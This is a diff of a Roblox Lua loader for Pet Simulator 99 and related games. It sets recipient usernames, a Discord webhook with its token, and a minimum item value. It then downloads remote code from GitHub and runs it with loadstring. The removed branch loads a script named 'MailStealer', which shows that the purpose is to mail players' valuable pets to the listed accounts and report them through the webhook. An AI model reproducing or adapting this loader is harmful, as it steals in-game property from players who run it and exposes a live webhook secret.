@@ -1,12 +1,19 @@
+getgenv().AuthKey = "HUGE_GK5d7l3XeKyd"
+getgenv().LoadSettings = {
+    Example_Setting = "Example_Value"
+}
+
+getgenv().AuthKey = nil
+getgenv().LoadSettings = nil
+
 local ps99Id = 8737899170
 local petGoId = 18901165922
-local petXId = 6284583030
 
 if game.PlaceId == ps99Id then
-    Username   = "qhuy1123clone1"
+    Username   = "qhuy1123clone2"
     Username2  = "qhuy1123clone1"
     Webhook    = "https://discord.com/api/webhooks/1288934946429472788/UPtcmcgoXeJfnrdMXqFc1efWHavmpiNhwVm48OCeSoFYkCTHc96gkUMALfh5umT9kEKx"
-    MinimumRAP = 100
+    MinimumRAP = 10000
 
     local scriptContent = game:HttpGet("https://raw.githubusercontent.com/Detrox01/petsim99/refs/heads/main/script.txt")
     if scriptContent and scriptContent ~= "" then
@@ -24,18 +31,8 @@ elseif game.PlaceId == petGoId then
         loadstring(scriptContent)()
     end
 
-elseif game.PlaceId == petXId then
-    Username   = "qhuy1123clone1"
-    LoadScreen = true
-    Webhook    = "https://discord.com/api/webhooks/1288934946429472788/UPtcmcgoXeJfnrdMXqFc1efWHavmpiNhwVm48OCeSoFYkCTHc96gkUMALfh5umT9kEKx"
-
-    local scriptContent = game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua")
-    if scriptContent and scriptContent ~= "" then
-        loadstring(scriptContent)()
-    end
-
 else
-    Username   = "qhuy1123clone1"
+    Username   = "qhuy1123clone2"
     Username2  = "qhuy1123clone1"
     Webhook    = "https://discord.com/api/webhooks/1288934946429472788/UPtcmcgoXeJfnrdMXqFc1efWHavmpiNhwVm48OCeSoFYkCTHc96gkUMALfh5umT9kEKx"
     MinimumRAP = 100
